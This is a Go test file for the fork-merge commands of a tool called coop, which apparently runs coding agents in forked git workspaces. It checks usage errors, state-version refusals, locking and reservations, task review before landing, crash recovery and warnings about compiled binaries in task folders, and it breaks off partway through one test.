package forkctl

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/AndrewDryga/coop/internal/box"
	"github.com/AndrewDryga/coop/internal/config"
	"github.com/AndrewDryga/coop/internal/egress"
	"github.com/AndrewDryga/coop/internal/forkspace"
	"github.com/AndrewDryga/coop/internal/networkstate"
	"github.com/AndrewDryga/coop/internal/project"
	"github.com/AndrewDryga/coop/internal/runtime"
	"github.com/AndrewDryga/coop/internal/sessionsvc"
	"github.com/AndrewDryga/coop/internal/tasks"
	"github.com/AndrewDryga/coop/internal/testutil/dockersock"
	"github.com/AndrewDryga/coop/internal/ui"
	"github.com/AndrewDryga/coop/internal/workerproto"
)

// A missing <name> (without --all) is a usage error (exit 2), reported before the dirty-tree /
// non-interactive environment gates — so the user sees the real problem, not "uncommitted changes".
func TestForkMergeRequiresName(t *testing.T) {
	c := &Control{cfg: &config.Config{}}
	var usage *ui.UsageError // a missing name is refused in the one shared block, not in prose
	if code, err := c.ForkMerge(nil); code != 2 || !errors.As(err, &usage) ||
		!strings.Contains(usage.Headline, "Missing fork name") {
		t.Errorf("ForkMerge(nil) = (%d, %v), want (2, usage error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"--nope"}); code != 2 || err == nil {
		t.Errorf("ForkMerge(--nope) = (%d, %v), want (2, unknown-flag error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"perf", "--all", "--yes"}); code != 2 || !errors.As(err, &usage) ||
		usage.Headline != `Cannot combine "<name>" and "--all" in "coop fork merge"` {
		t.Errorf("ForkMerge(perf --all --yes) = (%d, %v), want (2, the conflicting-options block)", code, err)
	}
}

func TestForkMergePreflightsUnsupportedStateBeforeEnvironmentGates(t *testing.T) {
	for _, args := range [][]string{{"old", "--yes"}, {"--all", "--yes"}} {
		t.Run(strings.Join(args, "_"), func(t *testing.T) {
			repo := initRepo(t)
			if _, err := forkspace.Setup(repo, "old"); err != nil {
				t.Fatal(err)
			}
			if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
				t.Fatal(err)
			}
			raw := []byte("owner-v3\nopaque\n")
			path := forkspace.PidPath(repo, "old")
			if err := os.WriteFile(path, raw, 0o644); err != nil {
				t.Fatal(err)
			}
			runtimeCalls := 0
			c := &Control{
				cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}},
				host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
					runtimeCalls++
					return runtime.Runtime{}, errors.New("runtime must not be consulted")
				}},
			}
			code, err := c.ForkMerge(args) // --yes lets a missing preflight reach the configured runtime gate
			if code != 1 || err == nil || !strings.Contains(err.Error(), "unsupported detached-worker state version") || strings.Contains(err.Error(), "--yes") {
				t.Fatalf("ForkMerge(%v) unsupported state = (%d, %v), want pre-gate version refusal", args, code, err)
			}
			if got, readErr := os.ReadFile(path); readErr != nil || string(got) != string(raw) {
				t.Fatalf("unsupported state changed = %q, %v; want exact %q", got, readErr, raw)
			}
			if runtimeCalls != 0 {
				t.Fatalf("unsupported merge resolved its runtime %d time(s)", runtimeCalls)
			}
		})
	}
}

func TestForkMergeAllRejectsBrokenForkRootBeforeRuntime(t *testing.T) {
	repo := initRepo(t)
	if err := os.WriteFile(forkspace.Home(repo), []byte("not a directory"), 0o644); err != nil {
		t.Fatal(err)
	}
	runtimeCalls := 0
	c := &Control{
		cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}},
		host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
			runtimeCalls++
			return runtime.Runtime{}, nil
		}},
	}
	code, err := c.ForkMerge([]string{"--all", "--yes"})
	if code != -1 || err == nil || !strings.Contains(err.Error(), forkspace.Home(repo)) {
		t.Fatalf("ForkMerge(--all) = (%d, %v), want fork discovery error", code, err)
	}
	if runtimeCalls != 0 {
		t.Fatalf("broken fork discovery resolved runtime %d time(s)", runtimeCalls)
	}
}

func TestForkMergeRunningRefusalKeepsLifecycleExitClass(t *testing.T) {
	repo := initRepo(t)
	if _, err := forkspace.Setup(repo, "busy"); err != nil {
		t.Fatal(err)
	}
	if err := forkspace.WritePid(repo, "busy", os.Getpid(), testWorkerGeneration); err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	code, err := c.ForkMerge([]string{"busy", "--yes"})
	if code != 1 || err == nil || !strings.Contains(err.Error(), "running or awaiting cleanup") {
		t.Fatalf("ForkMerge(running) = (%d, %v), want lifecycle refusal class 1", code, err)
	}
}

func TestForkMergeRejectsInvalidProjectBeforeRuntimeOrMutation(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "invalid-policy")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, project.File), []byte("gate: [\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", project.File)
	git(t, repo, "commit", "-qm", "invalid project policy")
	parentHead, forkHead := forkspace.GitOut(repo, "rev-parse", "HEAD"), forkspace.GitOut(ws, "rev-parse", "HEAD")
	runtimeCalls := 0
	c := &Control{
		cfg: &config.Config{RepoOverride: repo},
		host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
			runtimeCalls++
			return runtime.Runtime{}, nil
		}},
	}
	code, err := c.ForkMerge([]string{"invalid-policy", "--yes"})
	if code != -1 || err == nil || !strings.Contains(err.Error(), project.File) {
		t.Fatalf("ForkMerge = (%d, %v), want policy error", code, err)
	}
	if runtimeCalls != 0 {
		t.Fatalf("invalid project resolved runtime %d time(s)", runtimeCalls)
	}
	if got := forkspace.GitOut(repo, "rev-parse", "HEAD"); got != parentHead {
		t.Fatalf("parent HEAD changed: %s -> %s", parentHead, got)
	}
	if got := forkspace.GitOut(ws, "rev-parse", "HEAD"); got != forkHead {
		t.Fatalf("fork HEAD changed: %s -> %s", forkHead, got)
	}
}

func TestForkGateUsesSharedNetworkAdmission(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	repo := initRepo(t)
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, project.File), []byte("box:\n  egress: filtered\n  egress_rules:\n    - to: {domain: project.example}\n      protocol: tls\n      ports: [443]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", project.File)
	git(t, repo, "commit", "-qm", "request filtered network")
	c := &Control{cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}, Egress: "open"}}
	ok, err := c.runGateMode(repo, repo, "test-image", false)
	if ok || err == nil || !strings.Contains(err.Error(), "Review it: coop approve") {
		t.Fatalf("fork gate without approval = (%v, %v)", ok, err)
	}
}

func TestRemoteSessionReservationBlocksMergeAndRemovalEvenWithForce(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "session-owned")
	if err != nil {
		t.Fatal(err)
	}
	unlock, err := forkspace.LockState(repo, "session-owned")
	if err != nil {
		t.Fatal(err)
	}
	identity, err := forkspace.EnsureGenerationLocked(repo, "session-owned")
	if err == nil {
		err = forkspace.ReserveWorkspaceLocked(repo, forkspace.WorkspaceReservation{
			Version: forkspace.WorkspaceReservationVersion, Fork: identity,
			Kind: forkspace.WorkspaceReservationRemoteSession, OwnerStoreID: "store_test", OwnerID: "remote_session_test", CreatedAt: time.Now().UTC(),
		})
	}
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	if mergeUnlock, err := lockForkForMerge(repo, "session-owned"); err == nil {
		mergeUnlock()
		t.Fatal("merge acquired a remote-session-owned workspace")
	} else if !strings.Contains(err.Error(), "remote-session") {
		t.Fatalf("merge reservation refusal = %v", err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	if code, err := c.ForkRm([]string{"session-owned", "--force", "--yes"}); code != 1 || err == nil || !strings.Contains(err.Error(), "remote-session") {
		t.Fatalf("forced rm of reserved workspace = (%d, %v)", code, err)
	}
	if !pathExists(ws) {
		t.Fatal("forced rm deleted a remote-session-owned workspace")
	}
	unlock, err = forkspace.LockState(repo, "session-owned")
	if err != nil {
		t.Fatal(err)
	}
	err = forkspace.RemoveGenerationIfMatchesLocked(repo, identity)
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	if code, err := c.ForkRm([]string{"session-owned", "--force", "--yes"}); code != 1 || err == nil || !strings.Contains(err.Error(), "remote-session") {
		t.Fatalf("forced rm with missing generation and retained reservation = (%d, %v)", code, err)
	}
	if !pathExists(ws) {
		t.Fatal("forced rm deleted a reserved workspace with missing generation")
	}
	if _, reserved, err := forkspace.ReadWorkspaceReservation(repo, identity); err != nil || !reserved {
		t.Fatalf("forced rm changed stale reservation: reserved=%t err=%v", reserved, err)
	}
}

func TestForkMergeRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "race")
	if err != nil {
		t.Fatal(err)
	}
	head := forkspace.GitOut(repo, "rev-parse", "HEAD")
	raw := []byte("owner-v3\nopaque\n")
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	got := runForkCommandAcrossLockedMutation(t, repo, "race", func() (int, error) {
		return c.ForkMerge([]string{"race", "--yes"})
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "race"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code == 0 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("ForkMerge after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if forkspace.GitOut(repo, "rev-parse", "HEAD") != head || !pathExists(ws) {
		t.Fatal("merge mutated the parent or workspace after unsupported state appeared")
	}
	if data, readErr := os.ReadFile(forkspace.PidPath(repo, "race")); readErr != nil || string(data) != string(raw) {
		t.Fatalf("unsupported state changed = %q, %v; want exact %q", data, readErr, raw)
	}
}

func TestDestroyLandedForkRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "landed")
	if err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{}}
	result, err := c.mergeOne(repo, "", "landed", false)
	t.Cleanup(result.approval.close)
	if err != nil || result.approval == nil {
		t.Fatalf("land: %v", err)
	}
	raw := []byte("owner-v3\nopaque\n")
	got := runForkCommandAcrossLockedMutation(t, repo, "landed", func() (int, error) {
		if err := destroyLandedFork(runtime.Runtime{}, repo, "landed", result.approval); err != nil {
			return 1, err
		}
		return 0, nil
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "landed"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code != 1 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("destroy after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if !pathExists(ws) {
		t.Fatal("post-land cleanup deleted a workspace with unsupported state")
	}
}

func TestMergeOneNoGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}} // no COOP_GATE → no box needed

	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's file")
	}
}

// A Coop-Task trailer is not canonical task authority. Fork assignments land only from an exact
// generation candidate, so a Git-only fork remains a Git-only merge even if config points at an
// unusable task path.
func TestMergeOneDoesNotInferTaskCompletionFromTrailer(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	// A tasks path outside the repo: coop cannot work out which queues the land should reconcile.
	c := &Control{cfg: &config.Config{TasksFiles: []string{filepath.Join(t.TempDir(), "elsewhere")}}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work\n\nCoop-Task: t1")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if !landed || err != nil {
		t.Fatalf("mergeOne = (%v, %v), want Git-only land", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("Git-only trailer merge did not land")
	}
}

func prepareForkTaskCandidate(t *testing.T, name string) (string, string, string, forkspace.Identity, *Control) {
	return prepareForkTaskCandidateMode(t, name, false, true, nil)
}

// prepareForkTaskCandidateMode readies a fork for landing: its tasks (ids, or canonical-task when
// none are given) are done and its candidate is reviewed. fill, when set, writes what the fork's
// agent leaves in each projected task folder before the host accepts the projection.
func prepareForkTaskCandidateMode(t *testing.T, name string, isolated, makeCommit bool, fill func(t *testing.T, dir string), ids ...string) (string, string, string, forkspace.Identity, *Control) {
	t.Helper()
	var commit func(t *testing.T, ws, id string)
	if makeCommit {
		commit = func(t *testing.T, ws, id string) {
			if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("landed\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			git(t, ws, "add", "feature.txt")
			git(t, ws, "commit", "-qm", "implement canonical task\n\nCoop-Task: "+id)
		}
	}
	return prepareForkTaskCandidateHistory(t, name, isolated, commit, fill, ids...)
}

// prepareForkTaskCandidateHistory is prepareForkTaskCandidateMode with the fork's commits made by
// commit, once, for the first task, before the round is reviewed; nil makes none.
func prepareForkTaskCandidateHistory(t *testing.T, name string, isolated bool, commit func(t *testing.T, ws, id string), fill func(t *testing.T, dir string), ids ...string) (string, string, string, forkspace.Identity, *Control) {
	t.Helper()
	if len(ids) == 0 {
		ids = []string{"canonical-task"}
	}
	repo := initRepo(t)
	root := filepath.Join(repo, tasks.TasksRoot)
	if err := tasks.ScaffoldStateDirs(root); err != nil {
		t.Fatal(err)
	}
	for _, id := range ids {
		writeTaskFile(t, filepath.Join(root, tasks.StateTodo, id, "task.md"), "# Canonical task "+id+"\n- [x] required checks passed\n")
	}
	var ws string
	var err error
	if isolated {
		base, observeErr := observed(repo, "rev-parse", "HEAD")
		if observeErr != nil {
			t.Fatal(observeErr)
		}
		ws, err = forkspace.SetupIsolatedContext(t.Context(), repo, name, base)
	} else {
		ws, err = forkspace.Setup(repo, name)
	}
	if err != nil {
		t.Fatal(err)
	}
	unlock, err := forkspace.LockState(repo, name)
	if err != nil {
		t.Fatal(err)
	}
	var identity forkspace.Identity
	if isolated {
		identity, err = forkspace.EnsureIsolatedGenerationLocked(repo, name)
	} else {
		identity, err = forkspace.EnsureGenerationLocked(repo, name)
	}
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	// The fork takes its tasks one at a time, as its loop does: each is assigned, done and accepted
	// before the next one is assigned.
	for i := range ids {
		assignment, err := tasks.AssignForkTask([]string{root}, tasks.ForkAssignmentRequest{
			AuthorityRepo: repo, Fork: identity, WorkspaceRoot: ws,
			BaselineHead: forkspace.GitOut(ws, "rev-parse", "HEAD"),
			LeaseOwner:   tasks.TaskLeaseOwner{RunID: "test", PID: os.Getpid(), Provider: "codex", Target: "codex"},
		})
		if err != nil {
			t.Fatal(err)
		}
		if err := assignment.Lease.Release(); err != nil {
			t.Fatal(err)
		}
		id := assignment.Task.Item.ID
		if commit != nil && i == 0 { // one commit lands the whole candidate
			commit(t, ws, id)
		}
		projected, ok := mustCurrentTask(t, assignment.Owner.Projection, id)
		if !ok {
			t.Fatal("projected task missing")
		}
		if fill != nil {
			fill(t, projected.Dir)
		}
		if err := tasks.MoveTaskDir(assignment.Owner.Projection, projected, tasks.StateDone); err != nil {
			t.Fatal(err)
		}
		if _, err := tasks.AcceptForkProjection(repo, root, id, assignment.Owner); err != nil {
			t.Fatal(err)
		}
	}
	head, tree := forkspace.GitOut(ws, "rev-parse", "HEAD"), forkspace.GitOut(ws, "rev-parse", "HEAD^{tree}")
	review, exists, err := tasks.BeginForkCandidateReview(repo, identity, head, tree)
	if err != nil || !exists || !review.Required {
		t.Fatalf("begin task candidate review: review=%+v exists=%v err=%v", review, exists, err)
	}
	if err := tasks.AuthorizeForkCandidateReview(repo, identity, review.Candidate.ID); err != nil {
		t.Fatalf("authorize task candidate review: %v", err)
	}
	if _, published, err := tasks.PublishForkCandidate(repo, identity, head, tree); err != nil || !published {
		t.Fatalf("publish task candidate: published=%v err=%v", published, err)
	}
	c := &Control{cfg: &config.Config{ConfigDir: t.TempDir()}}
	return repo, ws, root, identity, c
}

func TestMergeOneLandsExactCandidateAndCanonicalTask(t *testing.T) {
	repo, _, root, identity, c := prepareForkTaskCandidate(t, "task-land")
	landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v)", landed, err)
	}
	if data, err := os.ReadFile(filepath.Join(repo, "feature.txt")); err != nil || string(data) != "landed\n" {
		t.Fatalf("landed Git content = %q, %v", data, err)
	}
	item, ok := mustCurrentTask(t, root, "canonical-task")
	if !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after land = %+v, ok=%v", item, ok)
	}
	if active, err := tasks.ForkTaskState(repo, identity); err != nil || active {
		t.Fatalf("fork task authority after land = %v, %v", active, err)
	}
	if _, ok, err := readLandIntent(repo, identity); err != nil || ok {
		t.Fatalf("land intent after completion = ok %v err %v", ok, err)
	}
}

// A fork loop that took another task after one passed review has no reviewed work to merge. The
// refusal names the task still at work, not the reviewed one, and the loop flag that stops once that
// work is reviewed.
func TestMergeRefusalNamesTheUnreviewedTaskAndTheStopFlag(t *testing.T) {
	repo := initRepo(t)
	root := filepath.Join(repo, tasks.TasksRoot)
	if err := tasks.ScaffoldStateDirs(root); err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"a-reviewed", "b-working"} {
		writeTaskFile(t, filepath.Join(root, tasks.StateTodo, id, "task.md"), "# Canonical task\n- [x] required checks passed\n")
	}
	ws, err := forkspace.Setup(repo, "runner")
	if err != nil {
		t.Fatal(err)
	}
	unlock, err := forkspace.LockState(repo, "runner")
	if err != nil {
		t.Fatal(err)
	}
	identity, err := forkspace.EnsureGenerationLocked(repo, "runner")
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	assign := func() tasks.ForkAssignment {
		t.Helper()
		assignment, err := tasks.AssignForkTask([]string{root}, tasks.ForkAssignmentRequest{
			AuthorityRepo: repo, Fork: identity, WorkspaceRoot: ws,
			BaselineHead: forkspace.GitOut(ws, "rev-parse", "HEAD"),
			LeaseOwner:   tasks.TaskLeaseOwner{RunID: "test", PID: os.Getpid(), Provider: "codex", Target: "codex"},
		})
		if err != nil {
			t.Fatal(err)
		}
		if err := assignment.Lease.Release(); err != nil {
			t.Fatal(err)
		}
		return assignment
	}
	reviewed := assign()
	projected, ok := mustCurrentTask(t, reviewed.Owner.Projection, reviewed.Task.Item.ID)
	if !ok {
		t.Fatal("projected task missing")
	}
	if err := tasks.MoveTaskDir(reviewed.Owner.Projection, projected, tasks.StateDone); err != nil {
		t.Fatal(err)
	}
	if _, err := tasks.AcceptForkProjection(repo, root, reviewed.Task.Item.ID, reviewed.Owner); err != nil {
		t.Fatal(err)
	}
	if working := assign(); working.Task.Item.ID != "b-working" {
		t.Fatalf("second assignment = %s, want b-working", working.Task.Item.ID)
	}

	c := &Control{cfg: &config.Config{ConfigDir: t.TempDir()}}
	landed, err := mergeOneForTest(t, c, repo, "", "runner", false)
	want := "runner has no reviewed work to merge: b-working is not reviewed yet — run its loop again with --stop-after-review, then merge it when it stops"
	if landed || err == nil || err.Error() != want {
		t.Fatalf("merge of a fork with unreviewed work = (%v, %v), want the refusal %q", landed, err, want)
	}
}

// A fork that cannot pass its own checks keeps its task paused. A person who brought its commit to
// the branch, and kept working there, takes the task with `coop tasks done --from-fork`; merging the
// fork afterwards drops the commit the branch already has instead of conflicting with the later
// work, lands nothing new and leaves the fork with no task to finish.
func TestMergeAfterDoneFromForkDropsTheCommitAlreadyLanded(t *testing.T) {
	for _, isolated := range []bool{false, true} {
		t.Run(fmt.Sprintf("isolated=%v", isolated), func(t *testing.T) {
			const id, name = "landed-elsewhere", "sweep-a"
			repo := initRepo(t)
			root := filepath.Join(repo, tasks.TasksRoot)
			if err := tasks.ScaffoldStateDirs(root); err != nil {
				t.Fatal(err)
			}
			writeTaskFile(t, filepath.Join(root, tasks.StateTodo, id, "task.md"), "# Landed elsewhere\n- [x] required checks passed\n")
			var ws string
			var err error
			if isolated {
				ws, err = forkspace.SetupIsolatedContext(t.Context(), repo, name, forkspace.GitOut(repo, "rev-parse", "HEAD"))
			} else {
				ws, err = forkspace.Setup(repo, name)
			}
			if err != nil {
				t.Fatal(err)
			}
			unlock, err := forkspace.LockState(repo, name)
			if err != nil {
				t.Fatal(err)
			}
			var identity forkspace.Identity
			if isolated {
				identity, err = forkspace.EnsureIsolatedGenerationLocked(repo, name)
			} else {
				identity, err = forkspace.EnsureGenerationLocked(repo, name)
			}
			unlock()
			if err != nil {
				t.Fatal(err)
			}
			assignment, err := tasks.AssignForkTask([]string{root}, tasks.ForkAssignmentRequest{
				AuthorityRepo: repo, Fork: identity, WorkspaceRoot: ws,
				BaselineHead: forkspace.GitOut(ws, "rev-parse", "HEAD"),
				LeaseOwner:   tasks.TaskLeaseOwner{RunID: "test", PID: os.Getpid(), Provider: "codex", Target: "codex"},
			})
			if err != nil {
				t.Fatal(err)
			}
			if err := assignment.Lease.Release(); err != nil {
				t.Fatal(err)
			}
			writeTaskFile(t, filepath.Join(ws, "feature.txt"), "landed\n")
			git(t, ws, "add", "feature.txt")
			git(t, ws, "commit", "-qm", "Implement it\n\nCoop-Task: "+id)
			if _, err := tasks.AcceptForkProjection(repo, root, id, assignment.Owner); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "fetch", "-q", ws, "HEAD")
			git(t, repo, "cherry-pick", "FETCH_HEAD")
			writeTaskFile(t, filepath.Join(repo, "feature.txt"), "landed, then polished\n")
			git(t, repo, "commit", "-qam", "Polish it")
			before := forkspace.GitOut(repo, "rev-parse", "HEAD")

			item, _ := mustCurrentTask(t, root, id)
			if _, err := tasks.CompleteLandedForkTask(repo, root, item); err != nil {
				t.Fatal(err)
			}
			c := &Control{cfg: &config.Config{ConfigDir: t.TempDir()}}
			if landed, err := mergeOneForTest(t, c, repo, "", name, false); err != nil || !landed {
				t.Fatalf("merge after done --from-fork = (%v, %v), want a clean land", landed, err)
			}
			if after := forkspace.GitOut(repo, "rev-parse", "HEAD"); after != before {
				t.Fatalf("the merge added %s to the branch; it already had the fork's commit", forkspace.GitOut(repo, "log", "--oneline", before+".."+after))
			}
			if data, err := os.ReadFile(filepath.Join(repo, "feature.txt")); err != nil || string(data) != "landed, then polished\n" {
				t.Fatalf("feature.txt after the merge = %q, %v", data, err)
			}
			if active, err := tasks.ForkTaskState(repo, identity); err != nil || active {
				t.Fatalf("fork task state after the merge = %v, %v; want none", active, err)
			}
		})
	}
}

// An isolated rebase skips a source commit only for a matching parent commit made since the last
// publication, never for the parent's own copy of published source: a source commit that redoes a
// change the parent has since reverted brings that change back.
func TestIsolatedMergeKeepsASourceCommitThatRedoesARevertedChange(t *testing.T) {
	repo, ws, _, c := isolatedTestFork(t)
	isolatedTestCommit(t, ws, "feature.txt", "feature\n")
	isolatedTestCommit(t, repo, "parent.txt", "parent\n") // so the publication rewrites the source commit
	if landed, err := mergeOneForTest(t, c, repo, "", "isolated", false); err != nil || !landed {
		t.Fatalf("first publication = %v, %v", landed, err)
	}
	git(t, repo, "revert", "--no-edit", "HEAD")
	git(t, ws, "revert", "--no-edit", "HEAD")
	git(t, ws, "revert", "--no-edit", "HEAD")
	if landed, err := mergeOneForTest(t, c, repo, "", "isolated", false); err != nil || !landed {
		t.Fatalf("second publication = %v, %v", landed, err)
	}
	if data, err := os.ReadFile(filepath.Join(repo, "feature.txt")); err != nil || string(data) != "feature\n" {
		t.Fatalf("feature.txt after the source redid the reverted change = %q, %v; want it back", data, err)
	}
}

// Landing a fork completes its tasks, so both the plain and the isolated landing warn as `coop
// tasks done` does when a folder they archive keeps a compiled program: once per task, in the same
// words, and led by the task's folder, since no line above the warning names the task. The warning
// is advice: the fork still lands, the archived folders keep their files, and the merge's result
// follows as a section of its own. A folder of evidence stays quiet.
func TestMergeWarnsAboutBulkInALandedTask(t *testing.T) {
	const elf = "\x7fELF\x02\x01\x01\x00"
	const advice = "  For a file a build can recreate, record its commit, sha256 and build command in log.md instead.\n"
	warning := func(id string) string {
		return "\n⚠ The task folder holds 1 compiled program\n\n" +
			"      Folder: .agent/tasks/99_done/" + id + "\n" +
			"      Programs: artifacts/coop\n" +
			"      Archived tasks keep their files until someone deletes them.\n\n" + advice
	}
	for _, tc := range []struct {
		name          string
		isolated      bool
		ids           []string // the fork's tasks; canonical-task when none
		file, content string   // the one file the fork's agent leaves in each task's artifacts/
		mode          os.FileMode
		warns         bool
	}{
		{name: "program", file: "coop", content: elf, mode: 0o755, warns: true},
		{name: "isolated program", isolated: true, file: "coop", content: elf, mode: 0o755, warns: true},
		{name: "two tasks", ids: []string{"first-task", "second-task"}, file: "coop", content: elf, mode: 0o755, warns: true},
		{name: "evidence", file: "gate.log", content: "ok\n", mode: 0o644},
	} {
		t.Run(tc.name, func(t *testing.T) {
			repo, _, root, identity, c := prepareForkTaskCandidateMode(t, "bulk", tc.isolated, true, func(t *testing.T, dir string) {
				path := filepath.Join(dir, "artifacts", tc.file)
				writeTaskFile(t, path, tc.content)
				if err := os.Chmod(path, tc.mode); err != nil {
					t.Fatal(err)
				}
			}, tc.ids...)
			t.Chdir(repo) // a person merges from the project root, so the folder prints relative to it
			// The merge commands, not mergeOne: only they print the result line after the warnings.
			var code int
			var err error
			stderr := captureStderr(t, func() {
				if tc.isolated {
					code, err = c.forkMergeIsolatedCommand(repo, identity.Name, identity, false, true, false)
				} else {
					code, err = c.forkMergeAll(repo, []string{identity.Name}, "", false, true)
				}
			})
			if code != 0 || err != nil {
				t.Fatalf("merge = (%d, %v), want a landing despite the warning\n%s", code, err, stderr)
			}
			result := "✓ Merged fork bulk into main\n"
			if tc.isolated {
				result = "✓ Published isolated fork bulk\n"
			}
			ids := tc.ids
			if len(ids) == 0 {
				ids = []string{"canonical-task"}
			}
			want, before := 0, "\n\n"
			if tc.warns {
				want, before = len(ids), advice+"\n"
			}
			if n := strings.Count(stderr, "The task folder "); n != want {
				t.Errorf("the merge warned %d times, want %d:\n%s", n, want, stderr)
			}
			if !strings.Contains(stderr, before+result) {
				t.Errorf("the merge's result does not follow one blank line:\n%s", stderr)
			}
			for _, id := range ids {
				if tc.warns && !strings.Contains(stderr, warning(id)) {
					t.Errorf("the warning about %s is not the one `coop tasks done` prints, led by its folder:\n%s", id, stderr)
				}
				if item, ok := mustCurrentTask(t, root, id); !ok || item.State != tasks.StateDone {
					t.Fatalf("task %s after land = %+v, ok=%v", id, item, ok)
				}
				data, err := os.ReadFile(filepath.Join(root, tasks.StateDone, id, "artifacts", tc.file))
				if err != nil || string(data) != tc.content {
					t.Errorf("the archived task %s lost its file: %q, %v", id, data, err)
				}
			}
			if _, err := os.Stat(filepath.Join(repo, "feature.txt")); err != nil {
				t.Errorf("the fork's commit did not land: %v", err)
			}
		})
	}
}

func TestMergeOneReplaysCrashAfterParentFastForward(t *testing.T) {
	repo, _, root, identity, c := prepareForkTaskCandidate(t, "task-crash")
	c.afterLandFastForward = func() error { return errors.New("injected crash after parent fast-forward") }
	landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false)
	if !landed || err == nil || !strings.Contains(err.Error(), "injected crash") {
		t.Fatalf("first merge = (%v, %v), want landed crash", landed, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("canonical task finalized before journal replay: %s", item.State)
	}
	c.afterLandFastForward = nil
	landed, err = mergeOneForTest(t, c, repo, "", identity.Name, false)
	if err != nil || !landed {
		t.Fatalf("replayed merge = (%v, %v)", landed, err)
	}
	item, _ = mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateDone {
		t.Fatalf("canonical task after replay = %s", item.State)
	}
}

func TestTaskCandidateMergeRecoversWhenParentMovesDuringGate(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-parent-move")
	c.gateOK = func(_, _, _ string) bool {
		if err := os.WriteFile(filepath.Join(repo, "hotfix.txt"), []byte("urgent\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, repo, "add", "hotfix.txt")
		git(t, repo, "commit", "-qm", "concurrent hotfix")
		return true
	}
	landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("merge across moved parent = (%v, %v)", landed, err)
	}
	if forkspace.GitOut(ws, "rev-parse", "HEAD") == "" {
		t.Fatal("candidate workspace was not restored")
	}
	intent, ok, err := readLandIntent(repo, identity)
	if err != nil || !ok || intent.Phase != landPreparing || intent.RebasedHead != "" || intent.ParentBefore != forkspace.GitOut(repo, "rev-parse", "HEAD") {
